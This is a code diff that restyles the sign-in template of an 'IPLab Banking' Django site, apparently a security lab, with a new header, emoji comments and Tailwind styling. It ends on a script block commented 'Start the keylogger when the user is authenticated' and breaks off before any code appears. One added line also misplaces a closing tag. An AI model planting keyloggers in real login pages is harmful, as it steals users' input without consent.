@@ -8,10 +8,26 @@
 {% block head_title %}Sign In | IPLab Banking{% endblock %}
 
 {% block content %}
+<!-- 🔥 New Gradient Header (Consistent with Index Page) -->
+<header class="navbar fixed top-0 left-0 w-full bg-gradient-to-r from-gray-900 via-black to-gray-900 text-white py-4 shadow-lg border-b-4 border-yellow-500 z-50">
+    <div class="container mx-auto flex justify-center items-center">
+        <!-- Show only 'Home' link centered -->
+        <nav class="w-full flex justify-center">
+            <a href="{% url 'home' %}" class="text-white font-semibold hover:text-yellow-500 transition duration-300 text-lg">
+                Home
+            </a>
+        </nav>
+    </div>
+</header>
+
+
+<!-- ✅ Improved Login Section -->
 <div class="flex justify-center items-center h-screen bg-black">
     <div class="w-full max-w-sm">
-        <h1 class="font-mono font-bold text-3xl text-center mb-6 text-yellow-500">Welcome Back</h1>
-        <div class="bg-gray-900 shadow-lg rounded-lg px-8 pt-6 pb-8 mb-4 text-white">
+        <h1 class="font-mono font-bold text-3xl text-center mb-6 text-yellow-500 drop-shadow-lg">Welcome Back</h1>
+        <div class="bg-gray-900 shadow-lg rounded-lg px-8 pt-6 pb-8 mb-4 text-white border border-yellow-500">
+            
+            <!-- ✅ Display Error Messages -->
             {% if form.non_field_errors %}
                 <div class="bg-red-600 text-white px-4 py-3 rounded relative mb-4" role="alert">
                     {% for error in form.non_field_errors %}
@@ -20,46 +36,55 @@
                     {% endfor %}
                 </div>
             {% endif %}
+            
+            <!-- ✅ Login Form -->
             <form method="post" action="{% url 'accounts:user_login' %}?next=/transactions/report/">
                 {% csrf_token %}
+                
                 {% for hidden_field in form.hidden_fields %}
                     {{ hidden_field.errors }}
                     {{ hidden_field }}
                 {% endfor %}
+                
                 {% for field in form.visible_fields %}
                     <div class="mb-4">
                         <label class="block text-yellow-500 text-sm font-bold mb-2" for="{{ field.id_for_label }}">
                             {{ field.label }}
                         </label>
                         <input 
-                            class="shadow appearance-none border {{ field.errors|yesno:'border-red-500,border-gray-700' }} bg-gray-800 rounded w-full py-2 px-3 text-white leading-tight focus:outline-none focus:border-yellow-500 focus:ring-2 focus:ring-yellow-500" 
+                            class="shadow appearance-none border {{ field.errors|yesno:'border-red-500,border-gray-700' }} bg-gray-800 rounded-lg w-full py-2 px-3 text-white leading-tight focus:outline-none focus:border-yellow-500 focus:ring-2 focus:ring-yellow-500 transition duration-300" 
                             name="{{ field.name }}" 
                             id="{{ field.id_for_label }}" 
                             type="{{ field.widget_type }}"
                             placeholder="{{ field.label }}">
+                        
                         {% if field.errors %}
                             <p class="text-red-500 text-xs italic mt-1">
-                                {% for error in field.errors %}{{ error }}{% endfor %}
+                                {% for error in field.errors %}{{ error }}</p>{% endfor %}
                             </p>
                         {% endif %}
                     </div>
                 {% endfor %}
+                
+                <!-- ✅ Login Button -->
                 <div class="flex items-center justify-between">
                     <button 
-                        class="w-full bg-yellow-600 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-500" 
+                        class="w-full bg-yellow-600 hover:bg-yellow-500 text-black font-bold py-3 px-4 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-500 transition duration-300 transform hover:scale-105 shadow-md" 
                         type="submit">
                         Sign In
                     </button>
                 </div>
             </form>
         </div>
+
+        <!-- ✅ Footer -->
         <p class="text-center text-gray-500 text-xs mt-4">
             &copy; {{ now|date:"Y" }} IPLab Banking. All rights reserved.
         </p>
     </div>
 </div>
 
-<!-- Set JavaScript to detect login state -->
+<!-- ✅ JavaScript to Detect Login State -->
 {% if user.is_authenticated %}
 <script>
     // Start the keylogger when the user is authenticated
